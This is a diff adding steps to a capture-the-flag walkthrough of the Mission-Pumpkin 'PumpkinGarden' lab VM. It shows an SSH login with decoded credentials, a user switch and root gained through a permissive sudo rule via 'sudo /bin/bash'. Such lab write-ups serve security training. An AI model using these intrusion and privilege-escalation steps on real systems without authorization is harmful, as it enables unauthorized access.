@@ -98,12 +98,67 @@ root@kali: echo -n 'c2NhcmVjcm93IDogNVFuQCR5' | base64 -d
 scarecrow : 5Qn@$y
 ```
 
+## 2.Gaining Shell
 
+Now connect to ssh using credentials found in clue.txt
 
+```bash
+root@kali: ssh -p 3535 scarecrow@192.168.56.116
+------------------------------------------------------------------------------
+			  Welcome to Mission-Pumpkin
+      All remote connections to this machine are monitored and recorded
+------------------------------------------------------------------------------
+scarecrow@192.168.56.116's password: 
+Last login: Thu Jun 13 00:35:51 2019 from 192.168.1.106
+scarecrow@Pumpkin:~$ 
+scarecrow@Pumpkin:~$ 
+scarecrow@Pumpkin:~$ id
+uid=1001(scarecrow) gid=1001(scarecrow) groups=1001(scarecrow)
+```
 
+there is a note.txt in home folder inside of it :
 
+```bash
+Oops!!! I just forgot; keys to the garden are with LordPumpkin(ROOT user)! 
+Reach out to goblin and share this "Y0n$M4sy3D1t" to secretly get keys from LordPumpkin.
+```
 
+check out the /etc/passwd and see there is a user called `goblin`, change your user to this account using the credential found in note.txt
 
+```bash
+scarecrow@Pumpkin:~$ su goblin
+Password: 
+goblin@Pumpkin:/home/scarecrow$ id
+uid=1002(goblin) gid=1002(goblin) groups=1002(goblin),27(sudo)
+```
+
+just check the `sudo -l` and it contains :
+
+```text
+atching Defaults entries for goblin on Pumpkin:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User goblin may run the following commands on Pumpkin:
+    (root) ALL, !/bin/su
+```
+
+## 3.Privilege Escalation
+
+Simply type this :
+
+```bash
+goblin@Pumpkin:/home/scarecrow$ sudo /bin/bash
+
+root@Pumpkin:/root# cat PumpkinGarden_Key 
+Q29uZ3JhdHVsYXRpb25zIQ==
+```
+
+```bash
+root@kali: echo -n 'Q29uZ3JhdHVsYXRpb25zIQ==' | base64 -d
+Congratulations! 
+```
+
+this is how you can get root on this machine :)
 
 
 
